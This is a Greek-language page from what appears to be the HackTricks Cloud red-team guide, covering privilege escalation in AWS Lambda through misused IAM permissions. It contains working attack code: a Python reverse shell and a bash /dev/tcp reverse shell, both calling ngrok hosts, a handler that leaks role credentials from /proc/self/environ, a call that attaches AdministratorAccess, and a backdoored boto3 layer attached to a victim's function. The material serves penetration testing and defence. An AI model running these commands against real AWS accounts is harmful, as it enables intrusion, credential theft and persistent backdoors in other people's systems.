# AWS - Εscalation προνομίων Lambda

<details>

<summary><strong>Μάθετε το χάκινγκ στο AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι υποστήριξης του HackTricks:

* Αν θέλετε να δείτε την **εταιρεία σας διαφημισμένη στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα τηλεγραφήματος**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>

## lambda

Περισσότερες πληροφορίες σχετικά με το lambda σε:

{% content-ref url="../aws-services/aws-lambda-enum.md" %}
[aws-lambda-enum.md](../aws-services/aws-lambda-enum.md)
{% endcontent-ref %}

### `iam:PassRole`, `lambda:CreateFunction`, (`lambda:InvokeFunction` | `lambda:InvokeFunctionUrl`)

Οι χρήστες με τα δικαιώματα **`iam:PassRole`, `lambda:CreateFunction`, και `lambda:InvokeFunction`** μπορούν να εξελίξουν τα προνόμιά τους.\
Μπορούν **να δημιουργήσουν μια νέα λειτουργία Lambda και να την αναθέσουν σε έναν υπάρχοντα ρόλο IAM**, χορηγώντας στη λειτουργία τα δικαιώματα που σχετίζονται με αυτόν το ρόλο. Ο χρήστης μπορεί στη συνέχεια **να γράψει και να μεταφορτώσει κώδικα σε αυτήν τη λειτουργία Lambda (με ένα αντίστροφο κέλυφος για παράδειγμα)**.\
Μόλις η λειτουργία είναι εγκατεστημένη, ο χρήστης μπορεί **να ενεργοποιήσει την εκτέλεσή της** και τις επιθυμητές ενέργειες καλύπτοντας τη λειτουργία Lambda μέσω του API του AWS. Με αυτήν την προσέγγιση, ο χρήστης μπορεί αποτελεσματικά να εκτελέσει εργασίες έμμεσα μέσω της λειτουργίας Lambda, λειτουργώντας με το επίπεδο πρόσβασης που χορηγείται στον ρόλο IAM που συσχετίζεται με αυτήν.\\

Ένας επιτιθέμενος θα μπορούσε να εκμεταλλευτεί αυτό για να πάρει ένα **αντίστροφο κέλυφος και να κλέψει το διακριτικό**:

{% code title="rev.py" %}
```python
import socket,subprocess,os,time
def lambda_handler(event, context):
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(('4.tcp.ngrok.io',14305))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(['/bin/sh','-i'])
time.sleep(900)
return 0
```
{% endcode %}
```bash
# Zip the rev shell
zip "rev.zip" "rev.py"

# Create the function
aws lambda create-function --function-name my_function \
--runtime python3.9 --role <arn_of_lambda_role> \
--handler rev.lambda_handler --zip-file fileb://rev.zip

# Invoke the function
aws lambda invoke --function-name my_function output.txt
## If you have the lambda:InvokeFunctionUrl permission you need to expose the lambda inan URL and execute it via the URL

# List roles
aws iam list-attached-user-policies --user-name <user-name>
```
Μπορείτε επίσης **να καταχραστείτε τα δικαιώματα του ρόλου lambda** από τη λειτουργία lambda ίδια.\
Αν ο ρόλος lambda είχε αρκετά δικαιώματα, θα μπορούσατε να το χρησιμοποιήσετε για να σας χορηγήσει δικαιώματα διαχειριστή:
```python
import boto3
def lambda_handler(event, context):
client = boto3.client('iam')
response = client.attach_user_policy(
UserName='my_username',
PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'
)
return response
```
Είναι επίσης δυνατή η διαρροή των διαπιστευτηρίων ρόλου του lambda χωρίς την ανάγκη εξωτερικής σύνδεσης. Αυτό θα ήταν χρήσιμο για **Διακομιστές Lambda που είναι απομονωμένοι από το δίκτυο** που χρησιμοποιούνται για εσωτερικές εργασίες. Αν υπάρχουν άγνωστες ομάδες ασφαλείας που φιλτράρουν τα αντίστροφα κελιά σας, αυτό το τμήμα κώδικα θα σας επιτρέψει να διαρρεύσετε απευθείας τα διαπιστευτήρια ως έξοδο του lambda.
```python
def handler(event, context):
sessiontoken = open('/proc/self/environ', "r").read()
return {
'statusCode': 200,
'session': str(sessiontoken)
}
```

```bash
aws lambda invoke --function-name <lambda_name> output.txt
cat output.txt
```
**Πιθανή Επίπτωση:** Άμεση αύξηση προνομίων στο καθορισμένο ρόλο υπηρεσίας lambda.

{% hint style="danger" %}
Σημείωση ότι ακόμα κι αν φαίνεται ενδιαφέρον το **`lambda:InvokeAsync`** **δεν** επιτρέπει από μόνο του την εκτέλεση της εντολής **`aws lambda invoke-async`**, χρειάζεστε επίσης το `lambda:InvokeFunction`
{% endhint %}

### `iam:PassRole`, `lambda:CreateFunction`, `lambda:AddPermission`

Όπως και στο προηγούμενο σενάριο, μπορείτε **να δώσετε στον εαυτό σας την άδεια `lambda:InvokeFunction`** αν έχετε την άδεια **`lambda:AddPermission`**
```bash
# Check the previous exploit and use the following line to grant you the invoke permissions
aws --profile "$NON_PRIV_PROFILE_USER" lambda add-permission --function-name my_function \
--action lambda:InvokeFunction --statement-id statement_privesc --principal "$NON_PRIV_PROFILE_USER_ARN"
```
**Πιθανή Επίπτωση:** Άμεση αύξηση προνομίων στο καθορισμένο ρόλο υπηρεσίας lambda.

Οι χρήστες με δικαιώματα **`iam:PassRole`, `lambda:CreateFunction`, και `lambda:CreateEventSourceMapping`** (και πιθανώς `dynamodb:PutItem` και `dynamodb:CreateTable`) μπορούν να αυξήσουν έμμεσα τα προνόμια ακόμη και χωρίς το `lambda:InvokeFunction`. Μπορούν να δημιουργήσουν μια λειτουργία Lambda με κακόβουλο κώδικα και να της αναθέσουν έναν υπάρχοντα ρόλο IAM.

Αντί να καλέσουν απευθείας τη Lambda, ο χρήστης δημιουργεί ή χρησιμοποιεί έναν υπάρχοντα πίνακα DynamoDB, συνδέοντάς τον με τη Lambda μέσω ενός χαρτογραφισμού πηγής συμβάντος. Αυτή η ρύθμιση εξασφαλίζει ότι η λειτουργία Lambda ενεργοποιείται αυτόματα με την εισαγωγή ενός νέου στοιχείου στον πίνακα, είτε από την ενέργεια του χρήστη είτε από άλλη διαδικασία, ενεργοποιώντας έτσι έμμεσα τη λειτουργία Lambda και εκτελώντας τον κώδικα με τα δικαιώματα του περασμένου ρόλου IAM.
```bash
aws lambda create-function --function-name my_function \
--runtime python3.8 --role <arn_of_lambda_role> \
--handler lambda_function.lambda_handler \
--zip-file fileb://rev.zip
```
Αν το DynamoDB είναι ήδη ενεργό στο περιβάλλον του AWS, ο χρήστης χρειάζεται μόνο **να καθιερώσει την αντιστοίχιση πηγής συμβάντος** για τη λειτουργία Lambda. Ωστόσο, αν το DynamoDB δεν χρησιμοποιείται, ο χρήστης πρέπει **να δημιουργήσει έναν νέο πίνακα** με ενεργοποιημένη τη ροή:
```bash
aws dynamodb create-table --table-name my_table \
--attribute-definitions AttributeName=Test,AttributeType=S \
--key-schema AttributeName=Test,KeyType=HASH \
--provisioned-throughput ReadCapacityUnits=5,WriteCapacityUnits=5 \
--stream-specification StreamEnabled=true,StreamViewType=NEW_AND_OLD_IMAGES
```
Τώρα είναι δυνατό να **συνδέσετε τη Lambda λειτουργία με τον πίνακα DynamoDB** με το **δημιουργία ενός χαρτογραφήματος πηγής συμβάντος**:
```bash
aws lambda create-event-source-mapping --function-name my_function \
--event-source-arn <arn_of_dynamodb_table_stream> \
--enabled --starting-position LATEST
```
Με τη λειτουργία Lambda που συνδέεται με το ρεύμα DynamoDB, ο επιτιθέμενος μπορεί **άμεσα να ενεργοποιήσει τη Lambda ενεργοποιώντας το ρεύμα DynamoDB**. Αυτό μπορεί να επιτευχθεί **εισάγοντας ένα στοιχείο** στον πίνακα DynamoDB:
```bash
aws dynamodb put-item --table-name my_table \
--item Test={S="Random string"}
```
**Πιθανή Επίδραση:** Άμεση ανύψωση προνομίων στον καθορισμένο ρόλο υπηρεσίας lambda.

### `lambda:AddPermission`

Ένας επιτιθέμενος με αυτήν την άδεια μπορεί **να χορηγήσει στον εαυτό του (ή σε άλλους) οποιεσδήποτε άδειες** (αυτό δημιουργεί πολιτικές βασισμένες στον πόρο για τη χορήγηση πρόσβασης στον πόρο):
```bash
# Give yourself all permissions (you could specify granular such as lambda:InvokeFunction or lambda:UpdateFunctionCode)
aws lambda add-permission --function-name <func_name> --statement-id asdasd --action '*' --principal arn:<your user arn>

# Invoke the function
aws lambda lambda invoke --function-name <func_name> /tmp/outout
```
{% endcode %}

**Πιθανή Επίπτωση:** Άμεση ανύψωση προνομίων στον ρόλο υπηρεσίας lambda με τη χορήγηση δικαιώματος να τροποποιήσει τον κώδικα και να τον εκτελέσει.

### `lambda:AddLayerVersionPermission`

Ένας επιτιθέμενος με αυτό το δικαίωμα μπορεί **να χορηγήσει στον εαυτό του (ή σε άλλους) το δικαίωμα `lambda:GetLayerVersion`**. Μπορεί να έχει πρόσβαση στο layer και να αναζητήσει ευπαθείς πληροφορίες ή ευαίσθητα δεδομένα.

{% code overflow="wrap" %}
```bash
# Give everyone the permission lambda:GetLayerVersion
aws lambda add-layer-version-permission --layer-name ExternalBackdoor --statement-id xaccount --version-number 1 --principal '*' --action lambda:GetLayerVersion
```
{% endcode %}

**Πιθανή Επίπτωση:** Πιθανή πρόσβαση σε ευαίσθητες πληροφορίες.

### `lambda:UpdateFunctionCode`

Οι χρήστες που διαθέτουν την άδεια **`lambda:UpdateFunctionCode`** έχουν τη δυνατότητα να **τροποποιήσουν τον κώδικα μιας υπάρχουσας λειτουργίας Lambda που συνδέεται με έναν ρόλο IAM.**\
Ο επιτιθέμενος μπορεί **να τροποποιήσει τον κώδικα της λειτουργίας Lambda για να εξαγάγει τα διαπιστευτήρια IAM**.

Παρόλο που ο επιτιθέμενος ενδέχεται να μην έχει την άμεση δυνατότητα να εκτελέσει τη λειτουργία, εάν η λειτουργία Lambda είναι προϋπάρχουσα και λειτουργική, είναι πιθανό να ενεργοποιηθεί μέσω υπαρχόντων ροών εργασίας ή συμβάντων, διευκολύνοντας έτσι έμμεσα την εκτέλεση του τροποποιημένου κώδικα.

{% code overflow="wrap" %}
```bash
# Thezip should contain the lambda code (trick: DOwnload the current one and add your code there)
aws lambda update-function-code --function-name target_function \
--zip-file fileb:///my/lambda/code/zipped.zip

# If you have invoke permissions:
aws lambda invoke --function-name my_function output.txt

# If not check if it's exposed in any URL or via an API gateway you could access
```
{% endcode %}

**Πιθανή Επίπτωση:** Άμεση αύξηση προνομιακών δικαιωμάτων στον λογαριασμό υπηρεσίας lambda που χρησιμοποιείται.

### `lambda:UpdateFunctionConfiguration`

#### RCE μέσω μεταβλητών περιβάλλοντος

Με αυτές τις άδειες, είναι δυνατή η προσθήκη μεταβλητών περιβάλλοντος που θα προκαλέσουν την εκτέλεση αυθαίρετου κώδικα από το Lambda. Για παράδειγμα, σε python είναι δυνατό να καταχωρηθούν μεταβλητές περιβάλλοντος `PYTHONWARNING` και `BROWSER` για να εκτελεστούν αυθαίρετες εντολές από ένα διεργασία python:
```bash
aws --profile none-priv lambda update-function-configuration --function-name <func-name> --environment "Variables={PYTHONWARNINGS=all:0:antigravity.x:0:0,BROWSER=\"/bin/bash -c 'bash -i >& /dev/tcp/2.tcp.eu.ngrok.io/18755 0>&1' & #%s\"}"
```
{% endcode %}

Για άλλες γλώσσες σεναρίων υπάρχουν άλλες μεταβλητές περιβάλλοντος που μπορείτε να χρησιμοποιήσετε. Για περισσότερες πληροφορίες ελέγξτε τις υποενότητες των γλωσσών σεναρίων στο:

{% embed url="https://book.hacktricks.xyz/macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse" %}

#### RCE μέσω Lambda Layers

[**Τα Lambda Layers**](https://docs.aws.amazon.com/lambda/latest/dg/configuration-layers.html) επιτρέπουν την συμπερίληψη **κώδικα** στη λειτουργία σας λάμδα αλλά **αποθηκεύοντάς τον ξεχωριστά**, έτσι ο κώδικας της λειτουργίας μπορεί να παραμείνει μικρός και **πολλές λειτουργίες μπορούν να μοιραστούν κώδικα**.

Μέσα στη λειτουργία λάμδα μπορείτε να ελέγξετε τα μονοπάτια από όπου φορτώνεται ο κώδικας Python με μια λειτουργία όπως η παρακάτω:
```python
import json
import sys

def lambda_handler(event, context):
print(json.dumps(sys.path, indent=2))
```
Αυτά είναι τα μέρη:

1. /var/task
2. /opt/python/lib/python3.7/site-packages
3. /opt/python
4. /var/runtime
5. /var/lang/lib/python37.zip
6. /var/lang/lib/python3.7
7. /var/lang/lib/python3.7/lib-dynload
8. /var/lang/lib/python3.7/site-packages
9. /opt/python/lib/python3.7/site-packages
10. /opt/python

Για παράδειγμα, η βιβλιοθήκη boto3 φορτώνεται από το `/var/runtime/boto3` (4η θέση).

#### Εκμετάλλευση

Είναι δυνατόν να καταχραστείτε την άδεια `lambda:UpdateFunctionConfiguration` για **προσθήκη νέου επιπέδου** σε μια λειτουργία lambda. Για να εκτελέσετε αυθαίρετο κώδικα, αυτό το επίπεδο πρέπει να περιέχει κάποια **βιβλιοθήκη που η λειτουργία lambda θα εισάγει.** Αν μπορείτε να διαβάσετε τον κώδικα της λειτουργίας lambda, μπορείτε να βρείτε αυτό εύκολα, επίσης σημειώστε ότι είναι πιθανό ότι η λειτουργία lambda **χρησιμοποιεί ήδη ένα επίπεδο** και θα μπορούσατε να **κατεβάσετε** το επίπεδο και να **προσθέσετε τον κώδικά σας** εκεί.

Για παράδειγμα, ας υποθέσουμε ότι η λειτουργία lambda χρησιμοποιεί τη βιβλιοθήκη boto3, αυτό θα δημιουργήσει ένα τοπικό επίπεδο με την τελευταία έκδοση της βιβλιοθήκης:
```bash
pip3 install -t ./lambda_layer boto3
```
Μπορείτε να ανοίξετε το `./lambda_layer/boto3/__init__.py` και **να προσθέσετε την πίσω πόρτα στον κώδικα** (ένα συνάρτηση για εξώφληση διαπιστευτικών ή για ανάκτηση αντίστροφης κέλυφους για παράδειγμα).

Στη συνέχεια, συμπιέστε τον φάκελο `./lambda_layer` και **ανεβάστε το νέο λάμδα layer** στον δικό σας λογαριασμό (ή στον λογαριασμό του θύματος, αλλά μπορεί να μην έχετε δικαιώματα γι' αυτό).\
Σημειώστε ότι πρέπει να δημιουργήσετε έναν φάκελο python και να τοποθετήσετε τις βιβλιοθήκες εκεί για να αντικαταστήσετε το /opt/python/boto3. Επίσης, το layer πρέπει να είναι **συμβατό με την έκδοση της python** που χρησιμοποιείται από το λάμδα και αν το ανεβάσετε στον δικό σας λογαριασμό, πρέπει να είναι στην **ίδια περιοχή:**
```bash
aws lambda publish-layer-version --layer-name "boto3" --zip-file file://backdoor.zip --compatible-architectures "x86_64" "arm64" --compatible-runtimes "python3.9" "python3.8" "python3.7" "python3.6"
```
{% endcode %}

Τώρα, κάντε το επιφορτισμένο lambda layer **προσβάσιμο από οποιοδήποτε λογαριασμό**:
```bash
aws lambda add-layer-version-permission --layer-name boto3 \
--version-number 1 --statement-id public \
--action lambda:GetLayerVersion --principal *
```
Και επισυνάψτε το λάμδα επίπεδο στη λειτουργία λάμδα του θύματος:
```bash
aws lambda update-function-configuration \
--function-name <func-name> \
--layers arn:aws:lambda:<region>:<attacker-account-id>:layer:boto3:1 \
--timeout 300 #5min for rev shells
```
Το επόμενο βήμα θα είναι είτε να **εκτελέσουμε τη λειτουργία** μόνοι μας αν μπορούμε, είτε να περιμένουμε μέχρι να **εκτελεστεί** με κανονικά μέσα - το οποίο είναι το ασφαλέστερο μέθοδο.

Μια **πιο αόρατη μέθοδος εκμετάλλευσης αυτής της ευπάθειας** μπορεί να βρεθεί στο:

{% content-ref url="../aws-persistence/aws-lambda-persistence/aws-lambda-layers-persistence.md" %}
[aws-lambda-layers-persistence.md](../aws-persistence/aws-lambda-persistence/aws-lambda-layers-persistence.md)
{% endcontent-ref %}

**Πιθανή Επίπτωση:** Άμεση ανύψωση προνομίων στον ρόλο υπηρεσίας lambda που χρησιμοποιείται.

### `?iam:PassRole`, `lambda:CreateFunction`, `lambda:CreateFunctionUrlConfig`, `lambda:InvokeFunctionUrl`

Ίσως με αυτές τις άδειες να είστε σε θέση να δημιουργήσετε μια λειτουργία και να την εκτελέσετε καλώντας το URL... αλλά δεν μπόρεσα να βρω έναν τρόπο να το δοκιμάσω, οπότε ενημερώστε με αν το κάνετε!

### Ενδιάμεση Επίθεση Lambda

Ορισμένες lambdas θα λαμβάνουν **ευαίσθητες πληροφορίες από τους χρήστες σε παραμέτρους.** Αν καταφέρετε RCE σε μία από αυτές, μπορείτε να εξαγάγετε τις πληροφορίες που άλλοι χρήστες στέλνουν σε αυτή, ελέγξτε το στο:

{% content-ref url="../aws-post-exploitation/aws-lambda-post-exploitation/aws-warm-lambda-persistence.md" %}
[aws-warm-lambda-persistence.md](../aws-post-exploitation/aws-lambda-post-exploitation/aws-warm-lambda-persistence.md)
{% endcontent-ref %}

## Αναφορές

* [https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/)
* [https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation-part-2/](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation-part-2/)

<details>

<summary><strong>Μάθετε το χάκινγκ στο AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι υποστήριξης του HackTricks:

* Αν θέλετε να δείτε την **εταιρεία σας διαφημισμένη στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια στο GitHub.

</details>
